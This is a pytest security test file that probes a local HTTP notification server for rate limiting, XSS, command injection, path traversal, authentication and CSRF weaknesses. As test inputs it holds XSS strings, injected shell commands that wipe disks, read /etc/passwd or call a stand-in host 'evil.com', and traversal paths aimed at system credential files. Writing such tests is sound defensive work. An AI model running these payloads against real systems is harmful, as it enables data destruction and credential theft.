"""Security test: HTTP Server vulnerabilities"""
import pytest
import requests
import json
import time
from threading import Thread


class TestHTTPSecurity:
    """Test HTTP server security"""
    
    BASE_URL = "http://localhost:5005"
    
    def test_rate_limiting(self):
        """Test if rate limiting works"""
        # Send 150 requests rapidly (should be blocked after 100)
        success_count = 0
        blocked_count = 0
        
        for i in range(150):
            try:
                response = requests.get(f"{self.BASE_URL}/?content=test{i}", timeout=1)
                if response.status_code == 200:
                    success_count += 1
                elif response.status_code == 429:
                    blocked_count += 1
            except:
                pass
        
        # Should have some blocked requests
        assert blocked_count > 0, "Rate limiting not working - all requests succeeded"
        print(f"Rate limit test: {success_count} success, {blocked_count} blocked")

    def test_xss_injection(self):
        """Test XSS injection in notification content"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for payload in xss_payloads:
            response = requests.get(f"{self.BASE_URL}/?content={payload}", timeout=1)
            # Should sanitize and not execute
            assert response.status_code == 200

    def test_command_injection_in_package_name(self):
        """Test command injection via package name"""
        malicious_packages = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& del /f /s /q C:\\*",
            "`whoami`",
            "$(curl evil.com)"
        ]
        
        for package in malicious_packages:
            data = {
                "package": package,
                "content": "Test notification"
            }
            response = requests.post(
                self.BASE_URL,
                json=data,
                timeout=1
            )
            # Should reject or sanitize
            assert response.status_code in [200, 400, 403]

    def test_path_traversal(self):
        """Test path traversal in URL"""
        traversal_paths = [
            "/../../../etc/passwd",
            "/..\\..\\..\\windows\\system32\\config\\sam",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        ]
        
        for path in traversal_paths:
            try:
                response = requests.get(f"{self.BASE_URL}{path}", timeout=1)
                # Should not expose system files
                assert "root:" not in response.text
                assert "[boot loader]" not in response.text
            except:
                pass

    def test_oversized_payload(self):
        """Test handling of oversized payloads"""
        # 20KB payload (server limit is 10KB)
        large_payload = "A" * 20480
        
        response = requests.post(
            self.BASE_URL,
            data={"content": large_payload},
            timeout=2
        )
        
        # Should reject with 413 Payload Too Large
        assert response.status_code in [413, 400]

    def test_malformed_json(self):
        """Test handling of malformed JSON"""
        malformed_jsons = [
            "{invalid json",
            '{"key": undefined}',
            '{"key": NaN}',
            '{"key": Infinity}'
        ]
        
        for malformed in malformed_jsons:
            response = requests.post(
                self.BASE_URL,
                data=malformed,
                headers={"Content-Type": "application/json"},
                timeout=1
            )
            # Should handle gracefully with 400
            assert response.status_code in [200, 400]

    def test_no_authentication(self):
        """Test if server accepts requests without authentication"""
        response = requests.get(f"{self.BASE_URL}/?content=test", timeout=1)
        
        # VULNERABILITY: Server accepts without auth
        if response.status_code == 200:
            print("⚠️ WARNING: Server has no authentication!")
            assert False, "Server should require authentication"

    def test_missing_csrf_token(self):
        """Test CSRF protection"""
        # POST without CSRF token
        response = requests.post(
            self.BASE_URL,
            json={"content": "test"},
            timeout=1
        )
        
        # Should require CSRF token
        # Currently vulnerable if returns 200
        if response.status_code == 200:
            print("⚠️ WARNING: No CSRF protection!")

    def test_http_method_tampering(self):
        """Test if server properly validates HTTP methods"""
        methods = ["PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]
        
        for method in methods:
            response = requests.request(
                method,
                f"{self.BASE_URL}/?content=test",
                timeout=1
            )
            # Should only allow GET/POST
            assert response.status_code in [200, 405, 501]
